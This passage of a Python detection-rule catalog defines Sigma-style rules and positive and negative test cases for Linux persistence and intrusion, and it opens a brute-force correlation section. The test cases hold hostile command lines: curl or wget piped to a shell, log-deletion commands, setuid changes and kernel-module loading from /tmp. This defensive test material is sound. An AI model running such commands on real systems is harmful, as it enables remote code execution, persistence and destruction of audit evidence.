            "scheduling directory or a per-user crontab file."
        ),
        techniques=["T1053.003"],
        refs=[attack_url("T1053.003"), MAN_CRONTAB],
        detection=[
            (
                "selection_cron_path",
                [
                    (
                        "TargetFilename|startswith",
                        ["/etc/cron.d/", "/var/spool/cron/", "/etc/crontab", "/etc/cron.daily/"],
                    )
                ],
            ),
            ("filter_package_manager", [("Image", ["/usr/bin/dpkg", "/usr/bin/rpm"])]),
        ],
        condition="selection_cron_path and not filter_package_manager",
        fps=[
            "Configuration management deploying log rotation and backup jobs to the scheduling "
            "directory on every managed server.",
            "Package installation that registers a maintenance job, which the package manager "
            "filter removes.",
        ],
        fp_strategy=(
            "Scheduled job deployment is routine. Tune by comparing the job content against the "
            "configuration management inventory and by flagging jobs that reference "
            "user-writable directories."
        ),
        tuning=(
            "Exclude the configuration management agent image rather than the scheduling "
            "directories. Keep per-user crontab writes visible, since they are less commonly "
            "managed."
        ),
        test_strategy=(
            "Positive cases write a system job and a per-user crontab. Negative cases write an "
            "unrelated file, use the package manager, and write a job documentation file."
        ),
        volume="Low to moderate on managed fleets.",
        related=["SDEL-LX-004"],
        pos=[
            case(
                "system_cron_job_written",
                "System scheduling entry created.",
                "Path selection matches and no filter applies.",
                TargetFilename="/etc/cron.d/synthetic-persistence",
                Image="/usr/bin/tee",
                User=USER_ADM,
            ),
            case(
                "user_crontab_written",
                "Per-user crontab written.",
                "Path selection matches and no filter applies.",
                TargetFilename="/var/spool/cron/synthetic-user",
                Image="/usr/bin/crontab",
                User=USER_STD,
            ),
        ],
        neg=[
            case(
                "unrelated_etc_file",
                "Unrelated configuration file written.",
                "The path selection does not match.",
                TargetFilename="/etc/synthetic-example.conf",
                Image="/usr/bin/vim",
            ),
            case(
                "package_manager_job",
                "Package manager installs a maintenance job.",
                "Path matches but the package manager filter removes the event.",
                TargetFilename="/etc/cron.d/synthetic-package-maintenance",
                Image="/usr/bin/dpkg",
            ),
            case(
                "job_documentation_written",
                "Documentation about scheduled jobs written to a home directory.",
                "The path selection does not match.",
                TargetFilename="/home/synthetic-user/cron-notes.txt",
                Image="/usr/bin/vim",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-LX-004",
        family="linux",
        path="linux/persistence",
        file="systemd_unit_created_in_unusual_location.yml",
        title="Systemd Service Unit Created In An Unusual Location",
        level="medium",
        profile="linux_file_event",
        desc=(
            "Detects creation of a service unit file outside the standard unit directories, for "
            "example under a temporary or home directory. Service units placed in writable "
            "locations are a persistence and privilege escalation pattern."
        ),
        hypothesis=(
            "If service-based persistence is installed from a writable location, a unit file "
            "will be created outside the managed unit directories."
        ),
        techniques=["T1543.002"],
        refs=[attack_url("T1543.002"), MAN_SYSTEMD],
        detection=[
            ("selection_unit_file", [("TargetFilename|endswith", [".service", ".timer"])]),
            (
                "selection_unusual_location",
                [("TargetFilename|startswith", ["/tmp/", "/var/tmp/", "/dev/shm/", "/home/"])],
            ),
        ],
        condition="selection_unit_file and selection_unusual_location",
        fps=[
            "Developer workstations where engineers prototype user-level service units in their "
            "home directory before promoting them.",
            "Build pipelines that generate unit files into a temporary staging directory before "
            "packaging them into an artefact.",
        ],
        fp_strategy=(
            "Benign matches concentrate on developer and build hosts. Tune on the host role and "
            "the writing process rather than on the unit file extension."
        ),
        tuning=(
            "Exclude the build workspace directory on build agents only. Keep temporary "
            "directories in scope on production servers."
        ),
        test_strategy=(
            "Positive cases create a unit in a temporary directory and in a home directory. "
            "Negative cases create a unit in the managed directory, create a non-unit file, and "
            "create a unit-named document."
        ),
        volume="Very low on production servers.",
        related=["SDEL-LX-003", "SDEL-COR-005"],
        pos=[
            case(
                "unit_in_tmp",
                "Service unit created in the temporary directory.",
                "Both extension and location selections match.",
                TargetFilename="/tmp/synthetic-example/synthetic-persistence.service",
                Image="/usr/bin/tee",
                User=USER_STD,
            ),
            case(
                "timer_in_home",
                "Timer unit created in a home directory.",
                "Both extension and location selections match.",
                TargetFilename="/home/synthetic-user/synthetic-beacon.timer",
                Image="/usr/bin/vim",
                User=USER_STD,
            ),
        ],
        neg=[
            case(
                "unit_in_managed_directory",
                "Service unit created in the managed unit directory.",
                "The location selection does not match.",
                TargetFilename="/etc/systemd/system/synthetic-agent.service",
                Image="/usr/bin/dpkg",
            ),
            case(
                "log_file_in_tmp",
                "Log file created in the temporary directory.",
                "The extension selection does not match.",
                TargetFilename="/tmp/synthetic-example/build.log",
                Image="/usr/bin/tee",
            ),
            case(
                "service_notes_document",
                "Notes document about services created in a home directory.",
                "The extension selection does not match.",
                TargetFilename="/home/synthetic-user/service-notes.txt",
                Image="/usr/bin/vim",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-LX-005",
        family="linux",
        path="linux/persistence",
        file="ssh_authorized_keys_modified.yml",
        title="SSH Authorized Keys File Modified",
        level="medium",
        profile="linux_file_event",
        desc=(
            "Detects modification of a user's authorized keys file. Adding a public key provides "
            "durable, password-independent remote access that survives password rotation."
        ),
        hypothesis=(
            "If key-based remote access persistence is installed, the authorized keys file for a "
            "user will be written."
        ),
        techniques=["T1098.004"],
        refs=[attack_url("T1098.004"), MAN_SSHD],
        detection=[
            ("selection_authorized_keys", [("TargetFilename|endswith", "/.ssh/authorized_keys")]),
            ("filter_configuration_agent", [("Image", "/usr/bin/synthetic-config-agent")]),
        ],
        condition="selection_authorized_keys and not filter_configuration_agent",
        fps=[
            "Configuration management distributing operator public keys to server fleets, which "
            "the configuration agent filter removes.",
            "Onboarding procedures where a new engineer adds their own key to a shared jump host "
            "account.",
        ],
        fp_strategy=(
            "Benign writes come from configuration management or from a documented onboarding "
            "step. Tune on the writing process image and review the resulting key comment and "
            "fingerprint."
        ),
        tuning=(
            "Exclude only the configuration agent absolute path. Do not exclude by user, since "
            "service account key files are the most sensitive of all."
        ),
        test_strategy=(
            "Positive cases write the key file for a standard user and for a service account. "
            "Negative cases cover the configuration agent, the client configuration file, and a "
            "known hosts file."
        ),
        volume="Low.",
        related=["SDEL-LX-002"],
        pos=[
            case(
                "user_key_file_written",
                "Authorized keys file written for a standard user.",
                "Path selection matches and the configuration agent filter does not apply.",
                TargetFilename="/home/synthetic-user/.ssh/authorized_keys",
                Image="/usr/bin/tee",
                User=USER_STD,
            ),
            case(
                "service_key_file_written",
                "Authorized keys file written for a service account.",
                "Path selection matches and the configuration agent filter does not apply.",
                TargetFilename="/home/synthetic-service/.ssh/authorized_keys",
                Image="/usr/bin/bash",
                User=USER_SVC,
            ),
        ],
        neg=[
            case(
                "configuration_agent_distribution",
                "Configuration agent distributes operator keys.",
                "Path matches but the configuration agent filter removes the event.",
                TargetFilename="/home/synthetic-admin/.ssh/authorized_keys",
                Image="/usr/bin/synthetic-config-agent",
            ),
            case(
                "client_configuration_written",
                "Client configuration file written.",
                "The path selection does not match.",
                TargetFilename="/home/synthetic-user/.ssh/config",
                Image="/usr/bin/vim",
            ),
            case(
                "known_hosts_updated",
                "Known hosts file updated after a first connection.",
                "The path selection does not match.",
                TargetFilename="/home/synthetic-user/.ssh/known_hosts",
                Image="/usr/bin/ssh",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-LX-006",
        family="linux",
        path="linux/process",
        file="shell_spawned_by_web_service_process.yml",
        title="Interactive Shell Spawned By A Web Service Process",
        level="critical",
        profile="linux_process_creation",
        desc=(
            "Detects a shell process whose parent is a web server or application server worker. "
            "This rule is rated critical because a web worker has no legitimate reason to start "
            "a shell in a normal deployment, the pattern is the defining signature of web shell "
            "execution, and the required response is to take the host out of service."
        ),
        hypothesis=(
            "If server-side content is used to execute commands, the resulting shell process "
            "will retain the web service worker as its parent image."
        ),
        techniques=["T1505.003"],
        extra_techniques=["T1059.004"],
        refs=[attack_url("T1505.003"), attack_url("T1059.004"), MAN_BASH],
        detection=[
            (
                "selection_web_parent",
                [
                    (
                        "ParentImage|endswith",
                        ["/nginx", "/httpd", "/apache2", "/php-fpm", "/synthetic-appserver"],
                    )
                ],
            ),
            (
                "selection_shell_child",
                [("Image|endswith", ["/bash", "/sh", "/dash", "/zsh", "/ksh"])],
            ),
        ],
        condition="selection_web_parent and selection_shell_child",
        fps=[
            "Deployment hooks where the application server intentionally shells out to a "
            "maintenance script during a release, usually only on the release host.",
            "Health check probes implemented as shell one-liners in older application "
            "configurations.",
        ],
        fp_strategy=(
            "The benign population is tiny and always uses the same command line. Tune on the "
            "exact command line of the deployment hook and require that it disappears outside "
            "release windows."
        ),
        tuning=(
            "Exclude the specific health check command line only. Never exclude the web worker "
            "parent, which would remove the only reliable web shell signal available from "
            "process telemetry."
        ),
        test_strategy=(
            "Positive cases pair two different web parents with two different shells. Negative "
            "cases keep the web parent with a non-shell child and place a shell under an "
            "ordinary parent."
        ),
        volume="Very low; each match warrants immediate triage.",
        related=["SDEL-LX-007", "SDEL-LX-011"],
        pos=[
            case(
                "php_worker_spawns_shell",
                "Application worker process spawns a shell.",
                "Parent and child selections both match.",
                ParentImage="/usr/sbin/php-fpm",
                ParentCommandLine="php-fpm: pool synthetic",
                Image="/bin/sh",
                CommandLine="sh -c id",
                User="synthetic-www",
            ),
            case(
                "web_server_spawns_bash",
                "Web server process spawns an interactive shell.",
                "Parent and child selections both match.",
                ParentImage="/usr/sbin/nginx",
                ParentCommandLine="nginx: worker process",
                Image="/bin/bash",
                CommandLine="bash -i",
                User="synthetic-www",
            ),
        ],
        neg=[
            case(
                "web_server_spawns_logrotate",
                "Web server invokes its log rotation helper.",
                "Parent matches but the child is not a shell.",
                ParentImage="/usr/sbin/nginx",
                Image="/usr/sbin/logrotate",
                CommandLine="logrotate /etc/logrotate.d/nginx",
            ),
            case(
                "session_shell",
                "Interactive login shell started by the session manager.",
                "Child matches but the parent is not a web service.",
                ParentImage="/usr/sbin/sshd",
                Image="/bin/bash",
                CommandLine="-bash",
                User=USER_STD,
            ),
            case(
                "cron_spawns_shell",
                "Scheduler runs a maintenance shell script.",
                "Child matches but the parent is the scheduler, covered by another rule.",
                ParentImage="/usr/sbin/cron",
                Image="/bin/sh",
                CommandLine="sh -c /usr/local/bin/synthetic-maintenance.sh",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-LX-007",
        family="linux",
        path="linux/process",
        file="network_retrieval_piped_to_shell.yml",
        title="Network Retrieval Command Piped Directly To A Shell",
        level="high",
        profile="linux_process_creation",
        desc=(
            "Detects a command line that retrieves remote content and pipes it straight into a "
            "shell interpreter. The pattern executes remote code without ever writing a "
            "reviewable file to disk."
        ),
        hypothesis=(
            "If remote code is executed without staging, the command line will contain a "
            "retrieval utility and a pipe into a shell in the same invocation."
        ),
        techniques=["T1059.004"],
        extra_techniques=["T1105"],
        refs=[attack_url("T1059.004"), attack_url("T1105"), MAN_BASH],
        detection=[
            ("selection_retrieval_tool", [("CommandLine|contains", ["curl ", "wget ", "fetch "])]),
            (
                "selection_pipe_to_shell",
                [("CommandLine|contains", ["| sh", "|sh", "| bash", "|bash", "| zsh"])],
            ),
        ],
        condition="selection_retrieval_tool and selection_pipe_to_shell",
        fps=[
            "Developer bootstrap instructions for internal tooling that install a command line "
            "client directly from an internal artefact service.",
            "Container build steps in older images that install a package manager helper through "
            "a retrieval and pipe idiom.",
        ],
        fp_strategy=(
            "Benign matches point at internal artefact hosts and occur on build or developer "
            "systems. Tune on the destination host inside the command line together with the "
            "host role."
        ),
        tuning=(
            "Exclude the internal artefact hostname on build agents. Do not exclude the pipe "
            "pattern, which is the behavioural core of the rule."
        ),
        test_strategy=(
            "Positive cases use two different retrieval utilities. Negative cases retrieve to a "
            "file, pipe a local file into a shell, and reference the pattern inside a "
            "documentation command."
        ),
        volume="Low on production servers; higher on build agents.",
        related=["SDEL-LX-006", "SDEL-LX-011"],
        pos=[
            case(
                "curl_piped_to_shell",
                "Retrieval utility output piped into a shell.",
                "Retrieval and pipe selections both match.",
                Image="/bin/bash",
                CommandLine=f"bash -c 'curl -fsSL {SYNTH_URL}/install.sh | sh'",
                ParentImage="/usr/sbin/sshd",
                User=USER_STD,
            ),
            case(
                "wget_piped_to_shell",
                "Alternate retrieval utility output piped into a shell.",
                "Retrieval and pipe selections both match.",
                Image="/bin/bash",
                CommandLine=f"bash -c 'wget -qO- {SYNTH_URL}/setup.sh | bash'",
                ParentImage="/usr/sbin/sshd",
                User=USER_STD,
            ),
        ],
        neg=[
            case(
                "curl_to_file",
                "Retrieval utility writing to a file for later review.",
                "The pipe selection does not match.",
                Image="/usr/bin/curl",
                CommandLine=f"curl -fsSL {SYNTH_URL}/install.sh -o /tmp/synthetic-example/install.sh",
            ),
            case(
                "local_script_piped",
                "Local file piped into a shell.",
                "The retrieval selection does not match.",
                Image="/bin/bash",
                CommandLine="bash -c 'cat /usr/local/share/synthetic-setup.sh | sh'",
            ),
            case(
                "documentation_grep",
                "Documentation searched for the retrieval idiom.",
                "The pipe selection matches a grep pipeline, but no retrieval utility is invoked.",
                Image="/bin/bash",
                CommandLine="bash -c 'grep -r install /usr/share/doc/synthetic'",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-LX-008",
        family="linux",
        path="linux/system",
        file="broad_setuid_permission_change.yml",
        title="Broad Or Setuid Permission Change Applied To A File",
        level="medium",
        profile="linux_process_creation",
        desc=(
            "Detects permission changes that set the setuid bit or grant world-writable access. "
            "Both outcomes create privilege escalation opportunities that persist until the "
            "permissions are corrected."
        ),
        hypothesis=(
            "If a privilege escalation path is created through file permissions, the permission "
            "utility will be invoked with a setuid or world-writable mode argument."
        ),
        techniques=["T1222.002"],
        refs=[attack_url("T1222.002"), MAN_CHMOD],
        detection=[
            ("selection_permission_tool", [("Image|endswith", ["/chmod", "/setfacl"])]),
            (
                "selection_broad_mode",
                [("CommandLine|contains", ["u+s", "g+s", " 4755", " 2755", " 777", "a+rwx"])],
            ),
        ],
        condition="selection_permission_tool and selection_broad_mode",
        fps=[
            "Legacy application installers that set the setuid bit on a helper binary that needs "
            "elevated privileges by design.",
            "Shared build directories where an engineer temporarily relaxes permissions to "
            "resolve a group ownership problem.",
        ],
        fp_strategy=(
            "Benign matches are rare and tied to specific legacy binaries. Tune by naming the "
            "affected file path rather than by excluding the permission utility."
        ),
        tuning=(
            "Exclude the exact legacy helper path if it is re-applied at every upgrade. Keep "
            "world-writable changes in scope everywhere."
        ),
        test_strategy=(
            "Positive cases set the setuid bit and a world-writable mode. Negative cases apply a "
            "restrictive mode, use another utility, and read permissions."
        ),
        volume="Low.",
        related=["SDEL-LX-002"],
        pos=[
            case(
                "setuid_bit_set",
                "Setuid bit applied to a binary in a temporary directory.",
                "Tool and mode selections both match.",
                Image="/usr/bin/chmod",
                CommandLine="chmod u+s /tmp/synthetic-example/synthetic-helper",
                User=USER_ADM,
            ),
            case(
                "world_writable_mode",
                "World-writable mode applied to a shared directory.",
                "Tool and mode selections both match.",
                Image="/usr/bin/chmod",
                CommandLine="chmod 777 /var/tmp/synthetic-shared",
                User=USER_ADM,
            ),
        ],
        neg=[
            case(
                "restrictive_mode",
                "Restrictive mode applied to a key file.",
                "The mode selection does not match.",
                Image="/usr/bin/chmod",
                CommandLine="chmod 600 /home/synthetic-user/.ssh/authorized_keys",
            ),
            case(
                "ownership_change",
                "Ownership changed on an application directory.",
                "The tool selection does not match.",
                Image="/usr/bin/chown",
                CommandLine="chown -R synthetic-service:synthetic-service /opt/synthetic-app",
            ),
            case(
                "permission_listing",
                "Permissions listed for review.",
                "Neither selection matches.",
                Image="/usr/bin/ls",
                CommandLine="ls -l /usr/local/bin",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-LX-009",
        family="linux",
        path="linux/system",
        file="audit_or_authentication_log_cleared.yml",
        title="Audit Or Authentication Log Clearing Attempt",
        level="high",
        profile="linux_process_creation",
        desc=(
            "Detects commands that remove or truncate the audit and authentication logs. "
            "Destroying these files removes the record of both the intrusion and the clearing "
            "action itself from the host."
        ),
        hypothesis=(
            "If host evidence is destroyed, a process will be observed invoking a deletion or "
            "truncation utility against an audit or authentication log path."
        ),
        techniques=["T1685.006"],
        refs=[attack_url("T1685.006"), MAN_AUDITD],
        detection=[
            (
                "selection_destructive_tool",
                [("Image|endswith", ["/rm", "/shred", "/truncate", "/unlink"])],
            ),
            (
                "selection_log_path",
                [
                    (
                        "CommandLine|contains",
                        [
                            "/var/log/auth.log",
                            "/var/log/secure",
                            "/var/log/audit/audit.log",
                            "/var/log/wtmp",
                        ],
                    )
                ],
            ),
        ],
        condition="selection_destructive_tool and selection_log_path",
        fps=[
            "Disk space remediation on a host where the audit log filled the filesystem and an "
            "operator removed a rotated copy under an incident ticket.",
            "Image preparation scripts that clear logs before a virtual machine template is "
            "captured.",
        ],
        fp_strategy=(
            "Benign matches occur on template build hosts or under a documented capacity "
            "incident. Tune on the host role and require an operator ticket, rather than "
            "excluding the log paths."
        ),
        tuning=(
            "Restrict exclusions to template build hosts. On production servers, treat every "
            "match as reviewable even when a capacity problem is suspected."
        ),
        test_strategy=(
            "Positive cases remove the authentication log and truncate the audit log. Negative "
            "cases read the log, rotate it with the rotation utility, and remove an unrelated "
            "file."
        ),
        volume="Very low.",
        related=["SDEL-WIN-010", "SDEL-LX-012"],
        pos=[
            case(
                "authentication_log_removed",
                "Authentication log removed.",
                "Tool and log path selections both match.",
                Image="/usr/bin/rm",
                CommandLine="rm -f /var/log/auth.log",
                User=USER_ADM,
            ),
            case(
                "audit_log_truncated",
                "Audit log truncated to zero length.",
                "Tool and log path selections both match.",
                Image="/usr/bin/truncate",
                CommandLine="truncate -s 0 /var/log/audit/audit.log",
                User=USER_ADM,
            ),
        ],
        neg=[
            case(
                "log_read_for_review",
                "Authentication log read during an investigation.",
                "The destructive tool selection does not match.",
                Image="/usr/bin/less",
                CommandLine="less /var/log/auth.log",
            ),
            case(
                "log_rotation",
                "Logs rotated by the rotation utility.",
                "The destructive tool selection does not match.",
                Image="/usr/sbin/logrotate",
                CommandLine="logrotate -f /etc/logrotate.conf",
            ),
            case(
                "temporary_file_removed",
                "Unrelated temporary file removed during cleanup.",
                "The log path selection does not match.",
                Image="/usr/bin/rm",
                CommandLine="rm -f /tmp/synthetic-example/build.log",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-LX-010",
        family="linux",
        path="linux/system",
        file="kernel_module_loaded_from_unusual_path.yml",
        title="Kernel Module Loaded From An Unusual Path",
        level="high",
        profile="linux_process_creation",
        desc=(
            "Detects a kernel module being inserted from a writable directory rather than from "
            "the managed module tree. Kernel modules run with the highest privilege available on "
            "the host."
        ),
        hypothesis=(
            "If a kernel-level component is loaded outside package management, the module "
            "loading utility will be invoked with a path in a writable directory."
        ),
        techniques=["T1547.006"],
        refs=[attack_url("T1547.006"), MAN_INSMOD],
        detection=[
            ("selection_module_tool", [("Image|endswith", ["/insmod", "/modprobe"])]),
            (
                "selection_unusual_path",
                [("CommandLine|contains", ["/tmp/", "/var/tmp/", "/dev/shm/", "/home/"])],
            ),
        ],
        condition="selection_module_tool and selection_unusual_path",
        fps=[
            "Driver development and hardware enablement testing on engineering hosts where "
            "modules are built and inserted from a working directory.",
            "Vendor support procedures that provide a debug module to be loaded from a temporary "
            "directory during a diagnostic session.",
        ],
        fp_strategy=(
            "Benign matches occur on engineering and diagnostic hosts under a support case. Tune "
            "on the host role and require the module to be removed at the end of the session."
        ),
        tuning=(
            "Exclude engineering hosts by name if necessary. Do not exclude the module loading "
            "utilities on production servers."
        ),
        test_strategy=(
            "Positive cases load modules from the temporary and home directories. Negative cases "
            "load from the managed module tree, remove a module, and list modules."
        ),
        volume="Very low.",
        related=["SDEL-LX-011"],
        pos=[
            case(
                "module_from_tmp",
                "Kernel module inserted from the temporary directory.",
                "Tool and path selections both match.",
                Image="/usr/sbin/insmod",
                CommandLine="insmod /tmp/synthetic-example/synthetic_module.ko",
                User=USER_ADM,
            ),
            case(
                "module_from_home",
                "Kernel module inserted from a home directory.",
                "Tool and path selections both match.",
                Image="/usr/sbin/insmod",
                CommandLine="insmod /home/synthetic-user/synthetic_module.ko",
                User=USER_ADM,
            ),
        ],
        neg=[
            case(
                "module_from_managed_tree",
                "Kernel module loaded by name from the managed module tree.",
                "The path selection does not match.",
                Image="/usr/sbin/modprobe",
                CommandLine="modprobe synthetic_supported_module",
            ),
            case(
                "module_removed",
                "Kernel module removed.",
                "The tool selection does not match.",
                Image="/usr/sbin/rmmod",
                CommandLine="rmmod synthetic_supported_module",
            ),
            case(
                "module_listing",
                "Loaded modules listed for inventory.",
                "Neither selection matches.",
                Image="/usr/bin/lsmod",
                CommandLine="lsmod",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-LX-011",
        family="linux",
        path="linux/process",
        file="process_executed_from_world_writable_path.yml",
        title="Process Executed From A World-Writable Directory",
        level="medium",
        profile="linux_process_creation",
        desc=(
            "Detects process execution from a world-writable directory such as the temporary "
            "directory or shared memory. Production binaries should live under managed "
            "directories owned by the package system."
        ),
        hypothesis=(
            "If tooling is executed after being staged in a writable directory, the process "
            "creation record will show an executable path rooted in that directory."
        ),
        techniques=["T1059.004"],
        refs=[attack_url("T1059.004"), MAN_FHS_TMP],
        detection=[
            (
                "selection_writable_directory",
                [("Image|startswith", ["/tmp/", "/var/tmp/", "/dev/shm/"])],
            ),
            (
                "filter_approved_build_output",
                [("Image|startswith", "/tmp/synthetic-example/approved-build/")],
            ),
        ],
        condition="selection_writable_directory and not filter_approved_build_output",
        fps=[
            "Build and test pipelines executing freshly compiled binaries from a temporary "
            "workspace, partly covered by the approved build output filter.",
            "Package installation scripts that run a helper from an extraction directory before "
            "the files are moved into place.",
            "Vendor diagnostic bundles that execute a collector binary from a temporary "
            "directory during a support session.",
        ],
        fp_strategy=(
            "Build hosts generate most of the benign volume. Tune on the host role and on the "
            "specific workspace prefix rather than on the temporary directory as a whole."
        ),
        tuning=(
            "Keep the approved build workspace filter as narrow as possible. Do not exclude the "
            "shared memory directory, which has very little legitimate execution."
        ),
        test_strategy=(
            "Positive cases execute from the temporary directory and from shared memory. "
            "Negative cases execute from managed directories and from the approved workspace."
        ),
        volume="Low on production servers; moderate on build agents.",
        related=["SDEL-LX-007", "SDEL-COR-006"],
        pos=[
            case(
                "binary_in_tmp",
                "Binary executed from the temporary directory.",
                "Writable directory selection matches and the workspace filter does not apply.",
                Image="/tmp/synthetic-example/synthetic-tool",
                CommandLine="/tmp/synthetic-example/synthetic-tool --synthetic-run",
                ParentImage="/bin/bash",
                User=USER_STD,
            ),
            case(
                "binary_in_shared_memory",
                "Binary executed from the shared memory directory.",
                "Writable directory selection matches and the workspace filter does not apply.",
                Image="/dev/shm/synthetic-loader",
                CommandLine="/dev/shm/synthetic-loader",
                ParentImage="/bin/sh",
                User=USER_STD,
            ),
        ],
        neg=[
            case(
                "binary_in_usr_bin",
                "System utility executed from the managed binary directory.",
                "The writable directory selection does not match.",
                Image="/usr/bin/cat",
                CommandLine="cat /etc/synthetic-example.conf",
            ),
            case(
                "approved_build_output",
                "Freshly built binary executed from the approved workspace.",
                "Path matches the selection but the workspace filter removes the event.",
                Image="/tmp/synthetic-example/approved-build/synthetic-app",
                CommandLine="/tmp/synthetic-example/approved-build/synthetic-app --test",
            ),
            case(
                "binary_in_opt",
                "Application executed from the optional software directory.",
                "The writable directory selection does not match.",
                Image="/opt/synthetic-app/bin/synthetic-app",
                CommandLine="/opt/synthetic-app/bin/synthetic-app --serve",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-LX-012",
        family="linux",
        path="linux/authentication",
        file="ssh_authentication_failure.yml",
        title="SSH Password Authentication Failure",
        level="low",
        profile="linux_auth",
        desc=(
            "Detects an individual password authentication failure reported by the secure shell "
            "daemon. A single failure is expected noise, so the rule is rated low and exists "
            "primarily to feed the brute force correlation rules."
        ),
        hypothesis=(
            "If credentials are guessed against the secure shell service, the authentication log "
            "will contain repeated password failure messages naming the target account and the "
            "source address."
        ),
        techniques=["T1110.001"],
        refs=[attack_url("T1110.001"), MAN_SSHD],
        detection=[
            ("selection_ssh_daemon", [("ProcessName", "sshd")]),
            (
                "selection_failure_message",
                [("Message|contains", ["Failed password for", "Failed publickey for"])],
            ),
        ],
        condition="selection_ssh_daemon and selection_failure_message",
        fps=[
            "Users mistyping a password after a rotation, which typically produces one or two "
            "failures followed by a success from the same address.",
            "Monitoring probes configured with an expired credential that fail on every polling "
            "interval from a known management address.",
        ],
        fp_strategy=(
            "Single failures are almost always benign. Value comes from volume and spread, so "
            "route this rule to correlation rather than to an analyst queue."
        ),
        tuning=(
            "Do not exclude individual users. Instead use the correlation rules that group by "
            "source address and count distinct target accounts."
        ),
        test_strategy=(
            "Positive cases record password and key failures. Negative cases record a success, a "
            "session close, and a failure reported by a different daemon."
        ),
        volume="Moderate to high on internet-facing hosts.",
        related=["SDEL-COR-002", "SDEL-COR-001"],
        pos=[
            case(
                "password_failure",
                "Password authentication failure for a standard user.",
                "Daemon and failure message selections both match.",
                ProcessName="sshd",
                Message=f"Failed password for {USER_STD} from {DOC_IP_2} port 50122 ssh2",
                User=USER_STD,
                SourceIp=DOC_IP_2,
            ),
            case(
                "invalid_user_failure",
                "Password authentication failure for an unknown account.",
                "Daemon and failure message selections both match.",
                ProcessName="sshd",
                Message=f"Failed password for invalid user synthetic-unknown from {DOC_IP_2} port 50123 ssh2",
                User="synthetic-unknown",
                SourceIp=DOC_IP_2,
            ),
        ],
        neg=[
            case(
                "successful_key_authentication",
                "Successful key-based authentication.",
                "The failure message selection does not match.",
                ProcessName="sshd",
                Message=f"Accepted publickey for {USER_STD} from {DOC_IP_1} port 50124 ssh2",
            ),
            case(
                "session_closed",
                "Session closed normally.",
                "The failure message selection does not match.",
                ProcessName="sshd",
                Message=f"pam_unix(sshd:session): session closed for user {USER_STD}",
            ),
            case(
                "sudo_authentication_failure",
                "Privilege escalation authentication failure reported by another program.",
                "The daemon selection does not match.",
                ProcessName="sudo",
                Message=f"pam_unix(sudo:auth): authentication failure; logname={USER_STD} uid=1000",
            ),
        ],
    )
)

# --------------------------------------------------------------------------------------
# Correlation catalog definition
# --------------------------------------------------------------------------------------


def seq(name: str, scenario: str, notes: str, events: list[dict[str, Any]]) -> dict[str, Any]:
    return {"name": name, "scenario": scenario, "notes": notes, "events": events}


def ev(profile: str, offset_seconds: int, **fields: Any) -> dict[str, Any]:
    return {"profile": profile, "offset": offset_seconds, "fields": fields}


CORRELATIONS: list[dict[str, Any]] = []

CORRELATIONS.append(
    dict(
        cid="SDEL-COR-001",
        path="correlation",
        file="authentication_failures_followed_by_success.yml",
        title="Authentication Failures Followed By A Successful Logon",
        level="medium",
        correlation_type="temporal_ordered",
        timespan="15m",
        group_by=["TargetUserName"],
        desc=(
            "Correlates Windows logon failures with a subsequent successful logon for the same "
            "account inside a fifteen minute window. The ordered sequence distinguishes a "
            "guessing attempt that eventually worked from ordinary isolated failures."
        ),
        hypothesis=(
            "If credential guessing succeeds, failure records for an account will be followed by "
            "a success record for the same account within a short window."
        ),
        techniques=["T1110.001"],
        refs=[attack_url("T1110.001"), ms_event(4625), SIGMA_CORRELATION_SPEC],
        fps=[
            "A user mistyping a password several times after a scheduled password rotation and "
            "then signing in successfully from the same workstation.",
            "An application service restarting with a stale cached credential, failing, and then "
            "succeeding once an operator updates the stored secret.",
        ],
        fp_strategy=(
            "Benign sequences involve a single source address and a small number of failures. "
            "Tune by requiring a minimum failure count and by comparing the source address of "
            "the failures with the source of the success."
        ),
        tuning=(
            "Raise the failure threshold before excluding accounts. Service accounts should be "
            "reviewed rather than excluded, since a stale credential is itself a finding."
        ),
        test_strategy=(
            "Positive sequences place failures before a success for the same account inside the "
            "window. Negative sequences reverse the order, use different accounts, and place the "
            "success outside the window."
        ),
        volume="Low once the failure threshold is applied.",
        related=["SDEL-COR-002", "SDEL-LX-012"],
        bases=[
            dict(
                name="sdel_cor_001_windows_logon_failure",
                title="Windows Logon Failure (Correlation Input)",
                profile="win_security",
                detection=[("selection_logon_failure", [("EventID", 4625)])],
                condition="selection_logon_failure",
                level="informational",
                desc=(
                    "Base rule that selects Windows logon failure records for use by the "
                    "authentication failure correlation rules."
                ),
                fps=[
                    "Ordinary password mistyping by interactive users on shared workstations, "
                    "typically one or two failures immediately followed by a success.",
                    "Scheduled tasks and services running with a stored credential that was not "
                    "updated after a password rotation.",
                ],
            ),
            dict(
                name="sdel_cor_001_windows_logon_success",
                title="Windows Logon Success (Correlation Input)",
                profile="win_security",
                detection=[("selection_logon_success", [("EventID", 4624)])],
                condition="selection_logon_success",
                level="informational",
                desc=(
                    "Base rule that selects successful Windows logon records for use by the "
                    "authentication failure correlation rules."
                ),
                fps=[
                    "All normal interactive and network logons across the estate, which is why "
                    "this base rule is never alerted on directly.",
                    "Service account logons generated by scheduled workloads and by management "
                    "agents polling on a fixed interval.",
                ],
            ),
        ],
        pos=[
            seq(
                "failures_then_success_same_account",
                "Four failures followed by a success for the same account.",
                "Ordered sequence completes inside the correlation window for one group key.",
                [
                    ev("win_security", 0, EventID=4625, TargetUserName=USER_STD, IpAddress=DOC_IP_2),
                    ev("win_security", 45, EventID=4625, TargetUserName=USER_STD, IpAddress=DOC_IP_2),
                    ev("win_security", 90, EventID=4625, TargetUserName=USER_STD, IpAddress=DOC_IP_2),
                    ev("win_security", 135, EventID=4625, TargetUserName=USER_STD, IpAddress=DOC_IP_2),
                    ev("win_security", 200, EventID=4624, TargetUserName=USER_STD, IpAddress=DOC_IP_2),
                ],
            ),
            seq(
                "failures_then_success_admin_account",
                "Failures followed by a success for an administrative account.",
                "Ordered sequence completes inside the correlation window for one group key.",
                [
                    ev("win_security", 0, EventID=4625, TargetUserName=USER_ADM, IpAddress=DOC_IP_2),
